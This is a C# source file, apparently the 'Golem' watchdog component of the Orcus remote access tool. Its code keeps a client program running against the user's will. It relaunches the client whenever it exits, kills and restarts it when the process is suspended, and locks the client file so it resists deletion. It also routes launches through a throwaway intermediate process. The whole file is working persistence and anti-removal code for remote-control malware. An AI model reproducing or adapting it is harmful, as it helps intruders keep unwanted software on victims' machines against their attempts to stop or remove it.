using System;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Threading;
using ThreadState = System.Diagnostics.ThreadState;

namespace Orcus.Golem
{
    static class Program
    {
        /// <summary>
        ///     The main entry point for the application.
        /// </summary>
        [STAThread]
        static void Main(string[] args)
        {
            if (args.Length < 2)
                return;

            var filename = Assembly.GetEntryAssembly().Location;
            switch (args[0])
            {
                case "/launchClientAndExit":
                    //Sample: /launchClientAndExit "C:\...\...\test.exe" 123
                    LaunchAndExit(args[1], "/keepAlive " + args[2]); //Launch client
                    return;
                case "/launchSelfAndExit":
                    //Sample: /launchSelfAndExit "C:\...\...\test.exe" 123 [/protectFile]
                    LaunchAndExit(filename,
                        $"/watchProcess \"{args[1]}\" {args[2]} {args.Skip(3).Aggregate("", (x, y) => x + "\"" + y + "\"")}");
                    return;
                case "/watchProcess":
                    // Sample: /watchProcess "C:\...\...\test.exe" 123 [/protectFile]
                    HoldAlive(args[1], int.Parse(args[2]), args.Contains("/protectFile"));
                    break;
            }
        }

        private static void LaunchAndExit(string fileName, string parameters)
        {
            var process = Process.Start(fileName, parameters);
            if (process != null)
                Environment.Exit(process.Id);
        }

        private static void HoldAlive(string filename, int processId, bool protectFile)
        {
            FileStream fileStream = null;
            if (protectFile)
                fileStream = new FileStream(filename, FileMode.Open, FileAccess.Read, FileShare.Read);

            WaitHandle[] waitHandles =
            {
                new ManualResetEvent(false),
                new ManualResetEvent(false)
            };

            Process keepAliveProcess = null;

            WaitCallback waitForExitCallback = state =>
            {
                var autoResetEvent = (ManualResetEvent) state;
                try
                {
                    keepAliveProcess.WaitForExit();
                }
                catch (Exception)
                {
                    // ignored
                }
                autoResetEvent.Set();
            };
            WaitCallback waitForSuspensionCallback = state =>
            {
                var autoResetEvent = (ManualResetEvent) state;
                try
                {
                    if (WaitForSuspension(keepAliveProcess))
                        keepAliveProcess.Kill();
                    else
                        return; //was killed, other waithandle must have reacted
                    //NOTE: Fine Brothers Entertainment might sue us, not sure if this comment has to be changed
                }
                catch (Exception)
                {
                    // ignored
                }
                autoResetEvent.Set();
            };

            using (fileStream)
                while (true)
                {
                    var thisFileLocation = Assembly.GetEntryAssembly().Location;
                    if (processId == 0)
                    {
                        var kamikazeProcess = Process.Start(thisFileLocation,
                            "/launchClientAndExit \"" + filename + "\" " + Process.GetCurrentProcess().Id);
                        if (kamikazeProcess == null)
                            return;
                        kamikazeProcess.WaitForExit();
                        keepAliveProcess = Process.GetProcessById(kamikazeProcess.ExitCode);
                    }
                    else
                    {
                        try
                        {
                            keepAliveProcess = Process.GetProcessById(processId);
                        }
                        catch (ArgumentException)
                        {
                            continue; //process is not running
                        }
                        finally
                        {
                            processId = 0;
                        }
                    }

                    //important because one will always be set if this isn't the first loop
                    for (int i = 0; i < waitHandles.Length; i++)
                        ((ManualResetEvent) waitHandles[i]).Reset();

                    ThreadPool.QueueUserWorkItem(waitForExitCallback, waitHandles[0]);
                    ThreadPool.QueueUserWorkItem(waitForSuspensionCallback, waitHandles[1]);
                    WaitHandle.WaitAny(waitHandles);
                }
        }

        private static bool WaitForSuspension(Process process)
        {
            while (!process.HasExited)
            {
                process.Refresh();
                foreach (ProcessThread thread in process.Threads)
                {
                    if (thread.ThreadState == ThreadState.Wait && thread.WaitReason == ThreadWaitReason.Suspended)
                        return true;
                }

                Thread.Sleep(500);
            }

            return false;
        }
    }
}